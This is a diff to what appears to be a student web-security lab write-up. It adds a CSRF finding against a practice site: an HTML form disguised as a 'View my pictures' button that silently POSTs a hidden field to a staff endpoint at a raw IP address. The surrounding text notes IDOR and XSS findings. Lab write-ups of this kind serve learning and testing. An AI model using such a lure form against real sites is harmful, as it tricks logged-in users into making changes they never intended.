@@ -33,7 +33,14 @@ Vulnerability #2: XSS on comment feedback section
 
 Vulnerability #1: IDOR can find salesperson who should not be shown by changing id
 
-Vulnerability #2: __________________
+Vulnerability #2: CSRF comment on green with following code
+
+<form action="https://35.224.49.128/red/public/staff/states/show.php?id=1" method="POST">
+<input type="hidden" name="name" value="4"/>
+<input type="submit" value="View my pictures"/>
+</form>
+
+sign into green and click view pictures button
 
 
 ## Notes
